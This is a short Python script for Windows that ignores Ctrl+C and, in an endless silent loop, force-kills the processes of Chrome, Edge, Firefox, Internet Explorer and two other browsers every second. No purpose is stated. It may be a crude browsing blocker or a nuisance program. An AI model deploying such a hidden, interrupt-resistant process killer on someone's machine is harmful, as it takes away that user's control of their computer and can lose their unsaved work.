from signal import signal, SIGINT, SIG_IGN
import subprocess
import time
signal(SIGINT, SIG_IGN)
while True:
  subprocess.Popen(["taskkill","/f","/im","chrome.exe"], creationflags=0x08000000).wait()
  subprocess.Popen(["taskkill","/f","/im","msedge.exe"], creationflags=0x08000000).wait()
  subprocess.Popen(["taskkill","/f","/im","plasmafox.exe"], creationflags=0x08000000).wait()
  subprocess.Popen(["taskkill","/f","/im","firefox.exe"], creationflags=0x08000000).wait()
  subprocess.Popen(["taskkill","/f","/im","iexplore.exe"], creationflags=0x08000000).wait()
  subprocess.Popen(["taskkill","/f","/im","r3dfox.exe"], creationflags=0x08000000).wait()
  time.sleep(1)
